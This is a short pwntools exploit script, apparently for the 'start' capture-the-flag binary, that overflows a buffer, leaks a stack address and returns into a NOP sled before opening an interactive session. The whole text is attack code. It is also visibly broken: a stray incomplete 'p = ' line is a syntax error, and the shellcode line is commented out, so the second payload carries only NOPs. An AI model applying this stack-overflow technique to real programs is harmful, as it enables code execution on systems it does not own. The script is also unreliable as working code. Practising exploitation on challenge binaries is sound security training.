from pwn import *
elf = context.binary = ELF("./start")
# payload = asm(shellcraft.sh())
p = 
p = process()
payload = asm('nop') * 20 + p32(0x08048087)
p.send(payload)
write("payload",payload)
p.recvuntil('CTF:')
stack_leak = u32(p.recv()[:4])
print(hex(stack_leak))
payload2 = b"A" * 20 + p32(stack_leak + 20) + asm('nop') * 9999
write("payload",payload)
p.send(payload2)
p.interactive()